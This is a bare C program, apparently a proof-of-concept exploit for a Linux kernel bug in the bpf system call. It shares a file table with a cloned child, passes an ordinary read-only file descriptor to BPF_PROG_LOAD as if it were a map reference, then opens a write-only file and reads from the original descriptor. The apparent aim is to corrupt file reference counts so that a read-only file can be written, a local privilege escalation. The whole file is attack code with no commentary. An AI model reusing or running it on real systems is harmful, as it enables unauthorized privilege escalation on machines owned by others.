#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>


#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int map_fd;

int task(void* arg){
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    while (1) sleep(1);
}
int main(void){
    map_fd = open("./tmp/read-only", O_RDONLY);
    char child_stack[20000];
	int child = clone(task, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);

    struct bpf_insn insns[2] = {
    {
        .code = BPF_LD | BPF_IMM | BPF_DW,
        .src_reg = BPF_PSEUDO_MAP_FD,
        .imm = map_fd
    },
    {
    }
    };
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = 2,
        .insns = (__aligned_u64) insns,
        .license = (__aligned_u64)""
    };
    syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    int dummy_fd = open("./tmp/write-only", O_WRONLY);
    const void *buf[10];
    read(map_fd, buf, 1);
}
